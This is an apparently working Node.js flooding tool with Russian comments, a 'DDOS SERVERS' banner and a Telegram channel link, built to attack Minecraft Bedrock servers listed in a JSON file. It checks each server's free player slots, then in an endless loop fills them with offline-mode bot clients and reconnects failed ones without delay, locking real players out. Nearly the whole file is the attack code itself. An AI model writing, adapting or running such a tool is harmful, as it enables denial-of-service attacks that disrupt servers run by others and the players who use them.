const { createClient, ping } = require('bedrock-protocol')
const mcs = require('node-mcstatus'); 
const fs = require('fs');
const readline = require('readline');

// Создаем интерфейс для ввода/вывода
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function menu() {
    console.log(`
     ██████╗ ██████╗  █████╗  ██████╗   ██████╗███████╗██████╗ ██╗   ██╗███████╗██████╗  ██████╗
     ██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗██╔════╝
     ██║  ██║██║  ██║██║  ██║╚█████╗   ╚█████╗ █████╗  ██████╔╝╚██╗ ██╔╝█████╗  ██████╔╝╚█████╗ 
     ██║  ██║██║  ██║██║  ██║ ╚═══██╗   ╚═══██╗██╔══╝  ██╔══██╗ ╚████╔╝ ██╔══╝  ██╔══██╗ ╚═══██╗
     ██████╔╝██████╔╝╚█████╔╝██████╔╝  ██████╔╝███████╗██║  ██║  ╚██╔╝  ███████╗██║  ██║██████╔╝
     ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═════╝
     тгк: t.me/darkteamLL

Выберите действие:
1. Сделать атаку на сервера из списка json файла
2. выход
`)
    const choice = await new Promise(resolve => rl.question('Ваш выбор: ', resolve));
    switch (choice) {
        case '1':
            (async () => {
                while (true) {
                    for (const server of servers) {
                        await createBotsForServer(server);
                    }
                    await new Promise(resolve => setTimeout(resolve, 0)); // Задержка перед следующей итерацией
                }
            })();
            break;
        case '2':
            rl.close();
            break;
        default:
            console.log("Выбран неверный пункт меню.");
            break;
    }
}
// Чтение серверов из JSON-файла
const servers = JSON.parse(fs.readFileSync('servers.json', 'utf8'));
// Функция для создания и подключения бота с логикой повторных попыток
async function createBot(username, host, port, version, ip_address) {
    const client = createClient({
        host: host,
        port: port,
        username: username,
        offline: true,
        version: version,
    });

    let connected = false;

    client.on('join', (packet) => {
        connected = true;
        console.log(`[${Date.now()}] ${username} успешно подключился к ${ip_address}`);
    });

    client.on('error', (err) => {
        console.error(`${username} - Ошибка:`, err);
        if (!connected) {
            console.error(`Не удалось подключить ${username}, повторная попытка...`);
            setTimeout(() => createBot(username, host, port, version, ip_address), 0);
        }
    });

    client.on('disconnect', (packet) => {
        console.log(`${username} отключился от сервера: ${packet.reason}`);
        if (!connected) {
            setTimeout(() => createBot(username, host, port, version, ip_address), 0);
        }
    });
}

// Функция для создания ботов на одном сервере
async function createBotsForServer(server) {
    const { host, port, version } = server;
    try {
        const result = await mcs.statusBedrock(host, port);
        const maxPlayers = result.players.max;
        const onlinePlayers = result.players.online;
        const choice = await new Promise(resolve => rl.question('Выберите максимальное количество ботов: ', resolve));
        if (onlinePlayers === -1 || maxPlayers === -1) {
            console.error(`Не удалось получить статус сервера ${host}:${port}`);
            return;
        }
        //console.log(`Сервер ${host}:${port} - Максимум игроков: ${maxPlayers}, Онлайн: ${onlinePlayers}`);
        const numBots = Math.min(choice , maxPlayers - onlinePlayers); // Ограничение до 10 ботов
        for (let i = 0; i < numBots; i++) {
            const username = `${Date.now() * i + 1 * maxPlayers * onlinePlayers}`; // Уникальные имена ботов
            createBot(username, host, port, version, result.ip_address);
            await new Promise(resolve => setTimeout(resolve, 0)); // Небольшая задержка
        }
    } catch (error) {
        console.error(`Не удалось подключить ботов к серверу ${host}:${port}: ${error.message}`);
    }
}
